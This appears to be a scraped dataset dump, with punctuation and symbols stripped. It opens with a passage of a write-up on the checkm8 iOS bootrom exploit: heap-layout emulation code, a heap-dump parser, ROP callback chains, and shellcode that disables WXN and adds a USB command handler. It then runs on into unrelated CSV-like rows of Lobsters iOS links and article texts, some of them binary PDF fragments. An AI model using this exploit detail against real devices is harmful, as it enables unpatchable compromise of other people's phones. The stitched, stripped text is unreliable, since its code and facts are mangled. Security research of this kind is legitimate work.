memory usb initialization including allocation iobuffer request better understanding let see request heap made dfu initialized analysis iboot source code reverseengineering securerom got following sequence allocation various string descriptor nonce size manufacturer product serial number configuration string allocation related creation usb controller task task structure task stack iobuffer configuration descriptor highspeed fullspeed request structure allocated small chunk heap allocation first category go allocation move thus able overflow usbdeviceiorequest referring old buffer look like calculate necessary offset simply emulated allocation listed adapted source code iboot heap little emulating request heap dfu include heaph include stdioh include unistdh include sysmmanh ifndef noleak define noleak endif int main void chunk mmap void protread protwrite mapprivate mapanonymous printf chunk pn chunk heapaddchunk chunk malloc alignment low order byte address secureram void descs void ioreq descs malloc descs malloc descs malloc descs malloc descs malloc const int n noleak void task malloc void taskstack malloc void memalign void h malloc void f malloc void zlps int n ioreq malloc int n zlps malloc free ioreq int printf descs pn descs printf task pn task printf taskstack pn taskstack printf iobuf pn printf h pn h printf f pn f int printf zlps pn zlps printf n int free descs free task free taskstack free free h free f descs malloc descs malloc descs malloc descs malloc descs malloc task malloc taskstack malloc void memalign h malloc f malloc int printf descs pn descs printf task pn task printf taskstack pn taskstack printf iobuf pn printf h pn h printf f pn f int ioreq malloc printf ioreq pn ioreq printf n printf ioreqoff lxn ioreq printf hsoff lxn h printf fsoff lxn f return output program request heap fengshui stage chunk descs descs descs descs descs task taskstack iobuf h f zlps zlps descs descs descs descs descs task taskstack iobuf h f ioreq ioreq ioreq ioreq ioreq ioreqoff hsoff fsoff see another usbdeviceiorequest appear offset beginning previous buffer corresponds exploit code structpack callbackchain check validity conclusion analyzing current status secureram heap got purpose wrote simple script par heap dump enumerates chunk keep mind usbdeviceiorequest overflow part metadata damaged skip analysis usrbinenv import struct hexdump import hexdump open heap rb f heap fread cur def parseheader cur thissize structunpack qqqqqq heap cur cur isfree prevfree prevsize thissize prevsize return thissize isfree prevsize prevfree true try thissize isfree prevsize prevfree parseheader cur except exception ex break print chunk hex cur thissize cur skipping damaged chunk thissize else break print hex thissize free isfree else nonfree hex prevsize prevfree hexdump heap cur cur min thissize cur thissize output script comment found spoiler see low order byte match result emulation result parsing heap secureramchunk nonfree chunk nonfree ff h fa fb fc fd fe ff chunk nonfree chunk nonfree host bridge chunk descs conf string nonfree apple obile de vice df fe ff u mode chunk task nonfree ksat chunk task stack nonfree katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats katskatskatskats chunk iobuf nonfree cmemcmem ef ff cc l cc l cc l cc l l x chunk h config nonfree fa fe chunk l config nonfree fa fe chunk nonfree cc l fa fb fc fd fe ff chunk nonfree ff ff ff ff de h fa fb fc fd fe ff chunk nonfree ff ff ff ff fa fb fc fd fe ff chunk nonfree ff ff ff ff fa fb fc fd fe ff chunk nonfree cpid cprv cpfm scep bdid ecid ibfl srtg chunk zlps nonfree ff ff ff ff fa fb fc fd fe ff chunk descs nonce nonfree ea nonc snon bba chunk descs manufacturer nonfree apple da db dc dd de df nc ea eb ec ed ee ef fa fb fc fd fe ff chunk descs product nonfree apple obile de vice df fe ff u mode chunk descs serial number nonfree cpid cprv cpfm scep bdid ecid ibfl srtg chunk zlps nonfree ff ff ff ff fa fb fc fd fe ff chunk free also achieve interesting effect overflowing configuration descriptor high speed full speed located right io buffer one field configuration descriptor responsible overall length overflowing field read beyond descriptor try modifying exploit allocation freeing io buffer without clearing global state device dfuacquiredevice deviceserialnumber device device dfureleasedevice device stage incomplete request uploading image created time global state initialized address buffer heap written iobuffer dfu reset dfuclrstatus request new iteration dfu begin overwriting usbdeviceiorequest heap useafterfree device dfuacquiredevice deviceserialnumber stall device leak device leak device device stage usbdeviceiorequest type object allocated heap overflown whose content defined first stage value overflow field callback next usbdeviceiorequest structure shown conforms name besides function return previous lr register restored call free skipped callback function usbcorecompleteendpointio important damage heap metadata due overflow would affect exploit case freeing attempt ldp sp restore fp lr ldp ret next point insecurememory later insecurememory store exploit payload offset payload callbackchain discus later placing payload range len payload device payload stage every following packet put memory area allocated image payload look like initializing shellcode new usb request handler fake translation table descriptor corresponds securerom match value original translation table fake translation table descriptor corresponds secureram match value original translation table fake translation table descriptor new value translates plus descriptor right code execution code disabling wxn usbropcallbacks callbackchain execution callbackchain dfuusbreset device dfureleasedevice device usb reset loop canceling incomplete usbdeviceiorequest queue going linked list started previous stage replaced rest queue allows u control callback chain build chain use gadget ldp usbdeviceiorequest pointer call address lsl mov blr call cmp csel lt b code xref mov code xref ldp sp ldp ret see offset pointer structure call address first argument loaded gadget easily make f x type call arbitrary f x entire call chain easily emulated unicorn engine modified version plugin uemu result entire chain iphone found dccivac sys ret clearing invalidating processor cache virtual address make processor address payload later dmb dmb sy ret memory barrier guarantee completion operation memory done instruction instruction highperformance processor executed order different programmed one purpose optimization entercriticalsection interrupt masked atomic execution operation msr translation table base register isb ret new value table register set address insecure memory exploit payload stored mentioned translation descriptor located certain offset payload rx rw rx tlbi dsb sy sys dsb sy isb ret translation table invalidated order translate address according new translation table mov add add str dmb sy mov msr dsb sy isb ret wxn write permission implies executenever disabled allow u execute code rw memory execution wxn disabling code possible due modified translation table msr translation table base register isb ret original value translation register restored necessary correct operation bootrom translation virtual address data insecurememory overwritten tlbi translation table reset exitcriticalsection interrupt handling back normal control transferred initializing shellcode thus main task callbackchain disable wxn transfer control shellcode rw memory execution shellcode shellcode following overwriting usb configuration descriptor global memory two pointer configuration descriptor usbcorehsconfigurationdescriptor usbcorefsconfigurationdescriptor located heap stored third stage descriptor damaged necessary correct interaction usb device shellcode restores changing usbserialnumber new string descriptor serial number created substring pwnd added help u understand exploit successful overwriting pointer usb request handler original pointer handler usb request interface overwritten pointer new handler placed memory next step copying usb request handler trampoline memory area upon receiving usb request new handler check wvalue request equal transfer control back original handler equal various command executed new handler like memcpy memset exec calling arbitrary address arbitrary set argument thus analysis exploit complete implementation exploit lower level working usb bonus example attack lower level published proofofconcept implementation arduino usb host shield poc work iphone easily ported device iphone dfu mode connected usb host shield step described article executed device enter pwnd mode connected pc via usb work using ipwndfu dump memory use crypto key etc method stable using asynchronous request minimal timeout work directly usb controller used library need minor modification patch file also repository place conclusion analyzing interesting hope article useful community motivate new research area vulnerability continue influence jailbreak community jailbreak based already developed since vulnerability unfixable always work vulnerable chip regardless io version plus many vulnerable device like iwatch apple tv etc expect interesting project apple device come besides jailbreak vulnerability also influence researcher apple device already boot io device verbose mode dump securerom use gid key decrypt firmware image although interesting application exploit would entering debug mode vulnerable device special jtagswd cable could done special prototype extremely hard get help special service thus apple research becomes way easier cheaper reference jonathan levin o internals iboot apple io security guide littlelailo apollotxt usborg usb nutshell ipwndfu ipwndfu fork linushenze
101,Lobsters,ios,Apple iOS,Six Reasons Why iOS 13 and Catalina Are So Buggy,https://tidbits.com/2019/10/21/six-reasons-why-ios-13-and-catalina-are-so-buggy/,six reason io catalina buggy,overloaded feature list lead schedule chicken crash report identify noncrashing bug lessimportant bug triaged regression get fixed old bug get ignored automated test used sparingly complexity ballooned looking forward,io macos catalina unusually buggy release apple beta started buggy wwdc june unexpected even apple removed feature final release september problem forced company publish quick update based year experience working apple software engineer idea overloaded feature list lead schedule chicken apple aggressive including significant feature upcoming product tight schedule ambitious feature set mean software engineer quality assurance qa engineer routinely work night weekend deadline approach inevitably feature postponed future release saw icloud drive folder sharing wellrun project feature lagging behind cut early engineer devote time polishing feature actually ship sometimes manager play schedule chicken since one want admit departmental meeting part project behind instead hope someone else working another aspect feature running even later reap benefit feature delayed without taking hit one delayed one blink engineer continue work feature possibly completed time eventually get pushed future release apple could address scheduling problem packing many feature release company culture product set release schedule like airpods rumored bluetooth tracking tile delayed really solid product annual release schedule like iphones operating system must ship september whatever state crash report identify noncrashing bug reporting turned recommend apple builtin crash reporter automatically report application crash even kernel crash back company crash report includes lot data especially useful stack trace show exactly code crashed importantly got point stack trace often enables engineer track crash fix crash report uniquely identified stack trace stack trace multiple crash report mean user seeing crash crash reporter backend sort crash report matching stack trace occur often get highest priority apple take crash report seriously try hard fix result apple software crash lot le used unfortunately crash reporter catch noncrashing bug blind photo never upload icloud contact card sync mac iphone time capsule backup get corrupted restarted every month setup app new iphone got caught loop repeatedly asking sign icloud account call apple support real problem experienced apple track noncrashing bug oldfashioned way human tester qa engineer automated test report thirdparty developer apple support needle say approach much art science much harder identify noncrashing bug particularly report apple support engineer track lessimportant bug triaged development apple triage bug based phase development cycle bug severity alpha engineer fix pretty much bug want development move alpha beta serious bug block major feature fixed ship date nears bug cause data loss crash get fixed approach sensible engineer every time change code chance introduce new bug change also trigger whole new round testing close shipping known bug understood impact better adding fix might break something new unaware bug generate lot apple store visit support call usually get fixed cost serious money pay enough support rep help lot user much cheaper fix bug worked apple product get list top bug driving apple store visit support call expected fix unfortunately bug rare terribly cause mere confusion instead data continually pushed back burner triage system regression get fixed old bug get ignored apple lousy fixing old bug apple pay special attention new product like iphone looking serious customer problem jump quickly generally good job eradicating major issue bug minor unusual enough survive early scrutiny may persist forever remember said change causing new bug engineer accidentally break working feature called regression expected fix file bug report qa engineer determines bug also exists previous release software marked regression definition new bug old bug chance one ever assigned fix group apple work way many drove crazy one group knew apple even made regression tshirts bug regression fix icloud photo upload bug contact syncing bug mentioned may never fixed automated test used sparingly software industry go fad like fashion industry automated testing currently fashionable various type automated testing testdriven design unit test userdriven testing etc need go detail except say apart specific area apple lot automated testing apple highly reliant manual testing probably much significant area automated testing battery performance every day operating system build loaded onto device iphones ipads apple watch etc run set automated test ensure battery performance degraded course automated test look apple code realworld interaction often significant battery performance issue tracked fixed manually beyond battery group inside apple known use automated test safari probably famous every code checkin trigger performance test checkin slows safari performance rejected automated testing would probably help apple software quality complexity ballooned another complication apple continually growing complexity ecosystem year ago apple sold mac processor one core program line code large singlethreaded modern apple operating system ten million line code mac iphone ipad apple watch airpods homepod talk talk icloud apps multithreaded communicate one another imperfect internet today apple product vastly complex past make development testing harder test matrix row feature o version also dimension compatible product test worse asynchronous event like multiple thread running multiple core push notification network latency mean practically impossible create comprehensive test suite looking forward unprecedented move apple announced io io shipped rare admission serious software quality problem apple immense resource company engineer tame year problem short term expect bug fix update frequent schedule past year longerterm sure higherups apple fully aware problem pondering best address besides fact bug expensive support cost engineer time starting become public relation concern apple charge premium price premium product lapse software quality stand hurt company reputation david shayer apple software engineer year worked ipod apple watch apple bugtracking system radar among project
102,Lobsters,ios,Apple iOS,iPhone 11 Pro Has Broken Exif Orientation Data,https://blog.feld.me/posts/2019/10/iphone-11-pro-has-broken-exif-orientation-data/,iphone pro broken exif orientation data,iphone pro broken exif orientation data feld exiftool,iphone pro broken exif orientation data fri october feld new iphone pro great camera turn photo taken far incorrect exif orientation data really suck confirmed issue happens wife phone shocking noticed apple phone released public photographer actually examined image shot phone example image jpeg format nonapple folk safari wo nt even load heif image data dumped exiftool exiftool version number file name directory file size kb file modification datetime file access datetime file inode change datetime file permission rw file type heic file type extension heic mime type imageheic major brand high efficiency image format hevc still image heic minor version compatible brand miaf mihb heic handler type picture primary item reference exif byte order bigendian motorola mm make apple camera model name iphone pro orientation rotate cw x resolution resolution resolution unit inch software modify date cb cr positioning centered exposure time f number exposure program program ae iso exif version datetime original create date offset time offset time original offset time digitized component configuration cb cr shutter speed value aperture value brightness value exposure compensation metering mode multisegment flash fire focal length mm subject area run time flag valid run time value run time scale run time epoch acceleration vector sub sec time original sub sec time digitized flashpix version color space uncalibrated exif image width exif image height sensing method onechip color area scene type directly photographed exposure mode auto white balance auto focal length format mm scene capture type standard lens info lens make apple lens model iphone pro back triple camera profile cmm type apple computer inc profile version profile class display device profile color space data rgb profile connection space xyz profile date time profile file signature acsp primary platform apple computer inc cmm flag embedded independent device manufacturer apple computer inc device model device attribute reflective glossy positive color rendering intent perceptual connection space illuminant profile creator apple computer inc profile id profile description display profile copyright copyright apple inc medium white point red matrix column green matrix column blue matrix column red tone reproduction curve binary data byte use b option extract chromatic adaptation blue tone reproduction curve binary data byte use b option extract green tone reproduction curve binary data byte use b option extract hevc configuration version general profile space conforming general tier flag main tier general profile idc main still picture profile gen profile compatibility flag main still picture main main constraint indicator flag general level idc level min spatial segmentation idc parallelism type chroma format bit depth luma bit depth chroma average frame rate constant frame rate unknown num temporal layer temporal id nested image width image height image spatial extent rotation image pixel depth movie data size movie data offset run time since power aperture image size megapixels scale factor mm equivalent shutter speed create date datetime original modify date circle confusion mm field view deg focal length mm mm equivalent mm hyperfocal distance light value note location data turned camera gps related stuff viewexif io show agrees someone please beg apple fix completely unacceptable let slip production
103,Lobsters,ios,Apple iOS,Explaining iOS' SecureROM boot chain,http://newosxbook.com/bonus/iBoot.pdf,explaining io securerom boot chain,,obj length r filter flatedecode stream xÿ™ h zbhw b e yrf kk
104,Lobsters,ios,Apple iOS,Debug registers in production A11 iPhones allow full-featured kernel debugging,https://bugs.chromium.org/p/project-zero/issues/detail?id=1900,debug register production iphones allow fullfeatured kernel debugging,,
105,Lobsters,ios,Apple iOS,Open-source jailbreaking tool for many iOS devices (all iPhones up to the iPhone 8 and X),https://github.com/axi0mX/ipwndfu,opensource jailbreaking tool many io device iphones iphone x,opensource jailbreaking tool many io device disclaimer quick start guide feature dependency tutorial jailbreakguide exploit writeup http ibss http coming soon disclaimer beta software warranty provided toolchain credit,opensource jailbreaking tool many io device read disclaimer using software permanent unpatchable bootrom exploit hundred million io device meant researcher jailbreak cydia yet allows dumping securerom decrypting keybags io firmware demoting device jtag current soc support future soc support full jailbreak cydia latest io version possible requires additional work quick start guide use cable connect device mac hold button needed enter dfu mode first run ipwndfu p exploit device repeat process fails reliable run ipwndfu dumprom get dump securerom run ipwndfu decryptgid keybag decrypt keybag run ipwndfu demote demote device enable jtag feature jailbreak downgrade iphone new bootrom untethered bootrom exploit pwned dfu mode exploit device pwned dfu mode exploit device pwned dfu mode shatter exploit device dump securerom device dump device flash device encrypt decrypt hex data connected device pwned dfu mode using gid uid key dependency tool compatible mac linux wo nt work virtual machine tutorial tool used downgrade jailbreak iphone new bootrom without shsh blob documented jailbreakguide exploit writeup writeup exploit found http ibss download iphone io ipsw apple http terminal extract ibss using following command move file ipwndfu folder unzip p coming soon reorganize refactor code easier setup download ibss automatically using partial zip dump securerom device install custom boot logo device jailbroken enable verbose boot device jailbroken disclaimer beta software backup data tool currently beta could potentially brick device attempt save copy data norbackups folder flashing new data attempt overwrite critical data device requires function something go wrong hopefully able restore latest ipsw itunes bring device back life use norbackups restore original state provide guarantee warranty provided warranty program extent permitted applicable law entire risk quality performance program program prove defective assume cost necessary servicing repair correction toolchain need use make compile anything use ipwndfu however wish make change assembly code src need use arm toolchain assemble source file running make using macos homebrew use binutils gccarmembedded install command brew install binutils brew cask install http credit geohot exploit posixninja shatter exploit chronic cpich ius musclenerd planetbeing posixninja et al exploit exploit walac pyusb
106,Lobsters,ios,Apple iOS,Apple‚Äôs use of Swift in iOS 13,https://blog.timac.org/2019/0926-state-of-swift-ios13/,apple use swift io,io io io methodology use swift io macos apple use swift io conclusion swiftui combine realitykit cryptokit,swift introduced apple wwdc interesting measure use swift io year io released included single application written swift calculator since number application using swift io grown year io io io io available let measure many application using swift year methodology methodology tool used article detailed previous post interested please refer use swift io macos apple use swift io list binary using swift io note binary might contain single line swift code necessarily entirely written swift list built using io iphone pro max applicationsactivitymessagesappapppluginsactivitymessagesextensionappexactivitymessagesextension applicationsappstoreappappstore applicationsappstoreapppluginsproductpageextensionappexproductpageextension applicationsappstoreapppluginssubscribepageextensionappexsubscribepageextension applicationsbusinessextensionswrapperapppluginsbusinessappexbusiness applicationsdiagnosticsappdiagnostics applicationsfindmyappfindmy applicationsfindmyapppluginsfindmynotificationscontentappexfindmynotificationscontent applicationsfindmyapppluginsfindmynotificationsserviceappexfindmynotificationsservice applicationsfindmyapppluginsfindmysiriintentsappexfindmysiriintents applicationsgamecenteruiserviceapppluginsgamecentermessageextensionappexgamecentermessageextension applicationshealthapphealth applicationssharingviewserviceappsharingviewservice applicationssidecarapppluginscontinuitycameraappexcontinuitycamera applicationssidecarapppluginscontinuitydisplayappexcontinuitydisplay applicationssidecarapppluginscontinuitymarkupappexcontinuitymarkup applicationssidecarapppluginscontinuitysignatureappexcontinuitysignature applicationssidecarapppluginscontinuitysketchappexcontinuitysketch applicationssidecarappsidecar systemlibraryaccountsdataclassownersstocksdataclassownerbundlestocksdataclassowner systemlibrarydistributedevaluationpluginsstocksdesdespluginstocksdes systemlibraryframeworksfileproviderframeworkpluginslocalstoragefileproviderappexlocalstoragefileprovider systemlibraryframeworksfileproviderframeworksupportfileproviderd systemlibraryframeworksidentitylookupframeworkxpcservicescomappleidentitylookupmessagefilterxpccomappleidentitylookupmessagefilter systemlibraryframeworkssecurityframeworkxpcservicestrustedpeershelperxpctrustedpeershelper systemlibrarymessagesimessageballoonsasmessagesproviderbundleasmessagesprovider systemlibrarynanotimekitcomplicationbundlesnanoreminderscomplicationbundlenanoreminderscomplication systemlibraryprivateframeworksassetviewerframeworkpluginsasvassetthumbnailappexasvassetthumbnail systemlibraryprivateframeworksassetviewerframeworkpluginsasvassetviewerappexasvassetviewer systemlibraryprivateframeworkscloudphotolibraryframeworksupportcloudphotod systemlibraryprivateframeworkscontactsdonationframeworkversionsasupportcontactsdonationagent systemlibraryprivateframeworkscoreparsecframeworkparsecfbf systemlibraryprivateframeworkscoreparsecframeworkparsecd systemlibraryprivateframeworksdocumentmanageruicoreframeworkpluginsaddtagsactionextensionappexaddtagsactionextension systemlibraryprivateframeworksdocumentmanageruicoreframeworkpluginsrecentsapppopoverappexrecentsapppopover systemlibraryprivateframeworksdocumentmanageruicoreframeworkpluginscomappledocumentmanagerserviceappexcomappledocumentmanagerservice systemlibraryprivateframeworksfmclientframeworkxpcservicesfmipclientxpcservicexpcfmipclientxpcservice systemlibraryprivateframeworkshealthmenstrualcyclesuiframeworkpluginshealthmenstrualcyclesnotificationcontentextensionappexhealthmenstrualcyclesnotificationcontentextension systemlibraryprivateframeworkshealthpluginhostframeworkhealthappd systemlibraryprivateframeworksreminderkitframeworkpluginsremindersnotificationcontentextensionappexremindersnotificationcontentextension systemlibraryprivateframeworksreminderkituiframeworkpluginscomapplereminderkituiremindercreationviewserviceappexcomapplereminderkituiremindercreationviewservice systemlibraryprivateframeworkssecurechannelframeworksecurechanneld systemlibraryprivateframeworkstelephonyutilitiesframeworkcallservicesd systemlibraryprivateframeworksupnextwidgetframeworkpluginsupnextappexupnext privatevarstagedsystemappsbooksappbooks privatevarstagedsystemappsbooksappframeworksbookcoreframeworkbookcore privatevarstagedsystemappsbooksappframeworksjsappframeworkjsapp privatevarstagedsystemappscalculatorappcalculator privatevarstagedsystemappsfilesappfiles privatevarstagedsystemappsfilesapppluginsrecentswidgetappexrecentswidget privatevarstagedsystemappsfitnessappfitness privatevarstagedsystemappsmeasureappmeasure privatevarstagedsystemappsmusicappframeworksmusicapplicationframeworkmusicapplication privatevarstagedsystemappsmusicappmusic privatevarstagedsystemappsmusicapppluginsmediapickerappexmediapicker privatevarstagedsystemappsmusicapppluginsmusicmessagesappappexmusicmessagesapp privatevarstagedsystemappsmusicapppluginsmusicnotificationcontentextensionappexmusicnotificationcontentextension privatevarstagedsystemappsmusicapppluginsplaybackintentappexplaybackintent privatevarstagedsystemappsmusicapppluginsrecentlyplayedtodayextensionappexrecentlyplayedtodayextension privatevarstagedsystemappspodcastsappframeworksappstorekitframeworkappstorekit privatevarstagedsystemappspodcastsappframeworksnowplayinguiframeworknowplayingui privatevarstagedsystemappspodcastsappframeworkspodcastsuiframeworkpodcastsui privatevarstagedsystemappspodcastsapppodcasts privatevarstagedsystemappsremindersapppluginsremindersintentsextensionappexremindersintentsextension privatevarstagedsystemappsremindersapppluginsremindersintentsuiextensionappexremindersintentsuiextension privatevarstagedsystemappsremindersapppluginsreminderssharingextensionappexreminderssharingextension privatevarstagedsystemappsremindersapppluginsremindersspotlightindexextensionappexremindersspotlightindexextension privatevarstagedsystemappsremindersapppluginsreminderstodayextensionappexreminderstodayextension privatevarstagedsystemappsremindersappreminders privatevarstagedsystemappsshortcutsappshortcuts privatevarstagedsystemappsstocksapppluginsstockstodayappexstockstoday privatevarstagedsystemappsstocksappstocks usrlibswiftlibswiftdemangledylib usrlibswiftlibswiftxctestdylib usrlibexecsidecarrelay usrlibexeccoreidvd usrlibexecremindd usrlibexecsearchpartyd usrlibexecsharingd usrlibexectzd shared dyld cache contains following additional binary lot swift library usrlibswiftlibswiftmapkitdylib usrlibswiftlibswiftphotosdylib usrlibswiftlibswiftscenekitdylib usrlibswiftlibswiftmetalkitdylib usrlibswiftlibswiftcoreimagedylib usrlibswiftlibswiftobjectivecdylib usrlibswiftlibswiftvisiondylib usrlibswiftlibswiftspeechdylib usrlibswiftlibswiftcompressiondylib usrlibswiftlibswiftcoremldylib usrlibswiftlibswiftwatchkitdylib usrlibswiftlibswiftcoredylib usrlibswiftlibswiftcoregraphicsdylib usrlibswiftlibswiftuikitdylib usrlibswiftlibswiftmetaldylib usrlibswiftlibswiftcoredatadylib usrlibswiftlibswiftdispatchdylib usrlibswiftlibswiftosdylib usrlibswiftlibswiftmediaplayerdylib usrlibswiftlibswiftcorefoundationdylib usrlibswiftlibswiftcloudkitdylib usrlibswiftlibswiftcoremididylib usrlibswiftlibswiftcallkitdylib usrlibswiftlibswiftdarwindylib usrlibswiftlibswiftcontactsdylib usrlibswiftlibswiftquartzcoredylib usrlibswiftlibswiftintentsdylib usrlibswiftlibswifthomekitdylib usrlibswiftlibswiftassetslibrarydylib usrlibswiftlibswiftpencilkitdylib usrlibswiftlibswiftcoreaudiodylib usrlibswiftlibswiftgameplaykitdylib usrlibswiftlibswiftcorenfcdylib usrlibswiftlibswiftmetrickitdylib usrlibswiftlibswiftavfoundationdylib usrlibswiftlibswiftmodeliodylib usrlibswiftlibswiftacceleratedylib usrlibswiftlibswiftnetworkdylib usrlibswiftlibswiftfoundationdylib usrlibswiftlibswiftcoremediadylib usrlibswiftlibswiftcorelocationdylib usrlibswiftlibswiftarkitdylib usrlibswiftlibswiftswiftononesupportdylib usrlibswiftlibswiftnaturallanguagedylib usrlibswiftlibswiftglkitdylib usrlibswiftlibswiftsimddylib systemlibraryhealthfeeditempluginsorgandonationhealthpluginorgandonation systemlibraryhealthfeeditempluginsmenstrualcyclesapppluginhealthpluginmenstrualcyclesappplugin systemlibraryhealthfeeditempluginshearthealthpluginheart systemlibraryhealthfeeditempluginseducationhealthplugineducation systemlibraryhealthfeeditempluginsapprecommendationshealthpluginapprecommendations systemlibraryhealthfeeditempluginshighlightsheavyhealthpluginhighlightsheavy systemlibraryhealthfeeditempluginssnippetshealthpluginsnippets systemlibraryhealthfeeditempluginsmedicalidhealthpluginmedicalid systemlibraryhealthfeeditempluginshighlightshealthpluginhighlights systemlibraryhealthfeeditempluginshighlightalertshealthpluginhighlightalerts systemlibraryhealthfeeditempluginshealthrecordshealthpluginhealthrecords systemlibraryaccountsnotificationdonationaccountwatcherbundledonationaccountwatcher systemlibraryaccountsnotificationcoreidvaccountnotificationpluginbundlecoreidvaccountnotificationplugin systemlibraryprivateframeworksteachartsframeworkteacharts systemlibraryprivateframeworksfmnetworkingframeworkfmnetworking systemlibraryprivateframeworksjetengineframeworkjetengine systemlibraryprivateframeworkssettingswallpapersettingsframeworkwallpapersettings systemlibraryprivateframeworkssettingslegalandregulatorysettingsprivateframeworklegalandregulatorysettingsprivate systemlibraryprivateframeworkssettingssettingsuikitprivateframeworksettingsuikitprivate systemlibraryprivateframeworkscoreknowledgeframeworkcoreknowledge systemlibraryprivateframeworkshealthrecordsuiframeworkhealthrecordsui systemlibraryprivateframeworksappanalyticsframeworkappanalytics systemlibraryprivateframeworkscloudkitcodeprotobufframeworkcloudkitcodeprotobuf systemlibraryprivateframeworkshealthvisualizationframeworkhealthvisualization systemlibraryprivateframeworksnewsarticlesframeworknewsarticles systemlibraryprivateframeworksknowledgegraphkitframeworkknowledgegraphkit systemlibraryprivateframeworksfmipcoreframeworkfmipcore systemlibraryprivateframeworkscoreutilsswiftframeworkcoreutilsswift systemlibraryprivateframeworksspsharedframeworkspshared systemlibraryprivateframeworksteadbframeworkteadb systemlibraryprivateframeworksnewsfeedframeworknewsfeed systemlibraryprivateframeworksteaactivitiesframeworkteaactivities systemlibraryprivateframeworkshealtheducationuiframeworkhealtheducationui systemlibraryprivateframeworksteauiframeworkteaui systemlibraryprivateframeworksstocksstocksanalyticsframeworkstocksanalytics systemlibraryprivateframeworksstocksstockscoreframeworkstockscore systemlibraryprivateframeworksstocksstocksuiframeworkstocksui systemlibraryprivateframeworksnewsanalyticsframeworknewsanalytics systemlibraryprivateframeworkshealthpluginhostframeworkhealthpluginhost systemlibraryprivateframeworksattributegraphframeworkattributegraph systemlibraryprivateframeworksfmfcoreframeworkfmfcore systemlibraryprivateframeworksappstorekitframeworkappstorekit systemlibraryprivateframeworkshealthexperienceuiframeworkhealthexperienceui systemlibraryprivateframeworkshealthprofileframeworkhealthprofile systemlibraryprivateframeworksteafoundationframeworkteafoundation systemlibraryprivateframeworksjetuiframeworkjetui systemlibraryprivateframeworksteasettingsframeworkteasettings systemlibraryprivateframeworkscryptokitprivateframeworkcryptokitprivate systemlibraryprivateframeworkscoherenceframeworkcoherence systemlibraryprivateframeworkshealthexperienceframeworkhealthexperience systemlibraryprivateframeworksconversationkitframeworkconversationkit systemlibraryprivateframeworksnewssubscriptionframeworknewssubscription systemlibraryprivateframeworksdocumentmanagerexecutablesframeworkdocumentmanagerexecutables systemlibraryprivateframeworkscloudkitcodeframeworkcloudkitcode systemlibraryprivateframeworksfmclientframeworkfmclient systemlibraryprivateframeworkspodcastskitframeworkpodcastskit systemlibraryframeworkscryptokitframeworkcryptokit systemlibraryframeworksrealitykitframeworkrealitykit systemlibraryframeworksswiftuiframeworkswiftui systemlibraryframeworkscombineframeworkcombine conclusion new io feature surprise built swift code corresponding application case findmy reminder sidecar apps also worth noting use swift health book shortcut apps apple wwdc apple also announced brand new framework built top swift swiftui combine realitykit le known awesome cryptokit expected framework appear list binary using swift exclude swift library io contains binary using swift doubling number io
107,Lobsters,ios,Apple iOS,iPadOS,https://www.apple.com/ipados/,ipados,apple arcade voice control new voice siri siri shortcut smarter way share useful way look map custom memoji message allnew reminder app text formatting tool mail new improved note audio sharing airpods personalized experience homepod see full list new ipados,apple arcade play groundbreaking new game storytelling design pushed ever game subscription service unlike learn voice control control ipad voice rich text editing feature let make correction dictate navigate comprehensively using voice command gesture even see number name next everything tap superimpose grid onscreen tap control new voice siri new siri voice us advanced neural technology sound natural speaking longer phrase like reading news answering knowledge question siri shortcut shortcut app single place siri shortcut new conversational shortcut let siri ask question clarify request like finding location want go say order usual coffee smarter way share share photo document ipad suggests might want share app may want use quickly share tap useful way look map look around show going seamless highresolution experience allnew map feature realistic detail road beach collection let track share mustsee spot custom memoji message make memoji one trillion new hairstyle headwear makeup piercings memoji automatically become sticker pack use message mail thirdparty apps allnew reminder app even easier create organize reminder smart list make easy display track upcoming reminder quick toolbar let add date time location flag photo scanned document siri suggests reminder might want add text formatting tool mail write professionallooking email go formatting option include font style size color alignment indenting outdenting text numbered bulleted list new improved note new gallery view powerful search help find whatever note need right need new checklist option help get done shared folder make easier collaborate others folder note audio sharing airpods pair two set airpods one ipad easily listen song watch movie along friend personalized experience homepod siri learn recognize voice family member using homepod everyone personalized experience see full list new ipados learn
109,Lobsters,ios,Apple iOS,Xmpp+signal+Bluetooth+p2p WiFi = serverless chat,https://monal.im/blog/xmppsignalbluetoothp2p-wifi-serverless-chat/,wifi serverless chat,airdrop monal io beta grab source github,almost messaging system become useless lose access internet happens internet cut disaster government app banned app store something thinking lately frequency natural disaster also internet cutoff tactic increasingly used authoritarian government result xmppomemo ie signal airdrop since circumvents internet never try connect anything work around national firewall internet block multiple layer encryption offered apple airdrop well application level encryption omemo hijacked airdrop file transfer automated process however work remarkably well attempt thing like usually open source documented protocol like signal work app closed additionally often dependence smsphone number inherently insecure system using airdrop allows notification show monal closed without going apns apple push system connection apple push server need establish initial key trust xmpp server however go offline work via airdrop recommend setting airdrop contact prevent spam hope qr code based key exchange point future circle trust established quickly person use existing server using app registration flow run simple xmpp server like prosody linux vm raspberry pi latest beta use airdrop mode go account toggle use air drop take account offline send message airdrop share sheet appear asked select recipient text message airdrop mode create xmpp payload message encrypted signal protocol send recipient suggest set airdrop receiving setting contact contact io contact app send file case message primary flaw airdrop seen screen sure get around right peer peer obviously also need nearby message well really intended small group close proximity need communicate grid try monal io beta let know work since monal open source monal blocked reason anyone grab source github build friend version monal whether app store self compiled compatible messaging
110,Lobsters,ios,Apple iOS,"Apple Special Event for September 10th, 2019",https://www.apple.com/apple-events/livestream/,apple special event september,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
111,Lobsters,ios,Apple iOS,Apple SIMD/DSP extensions,https://www.realworldtech.com/forum/?threadid=187087&curpostid=187087,apple simddsp extension,,link existing content search search term specified showing recent item search use arrow key select item
112,Lobsters,ios,Apple iOS,A message about iOS security,https://www.apple.com/newsroom/2019/09/a-message-about-ios-security/,message io security,,last week google published blog vulnerability apple fixed io user february heard customer concerned claim want make sure customer fact first sophisticated attack narrowly focused broadbased exploit iphones en masse described attack affected fewer dozen website focus content related uighur community regardless scale attack take safety security user extremely seriously google post issued six month io patch released creates false impression mass exploitation monitor private activity entire population real time stoking fear among iphone user device compromised never case second evidence indicates website attack operational brief period roughly two month two year google implies fixed vulnerability question february working extremely quickly resolve issue day learned google approached u already process fixing exploited bug security neverending journey customer confident working io security unmatched take endtoend responsibility security hardware software product security team around world constantly iterating introduce new protection patch vulnerability soon found never stop tireless work keep user safe
